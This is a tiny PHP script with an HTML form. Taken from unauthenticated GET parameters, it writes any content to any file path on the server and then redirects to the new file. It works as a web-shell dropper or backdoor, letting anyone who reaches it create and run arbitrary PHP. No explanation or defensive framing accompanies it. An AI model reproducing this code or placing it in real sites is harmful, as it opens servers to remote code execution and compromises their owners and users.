<?php
    if (isset($_GET['filename'])){
        $filename = $_GET['filename'];
        $cont = $_GET['cont'];
        $fp = fopen($filename, 'w+');
        fwrite($fp, $cont);
        fclose($fp);

        header("Location: {$filename}");
    }


?>
<form>
    <input type="text" name="filename" /><br />
    <textarea cols='40' rows="10" name="cont"></textarea><br />
    <input type="submit" value="OK" />
</form>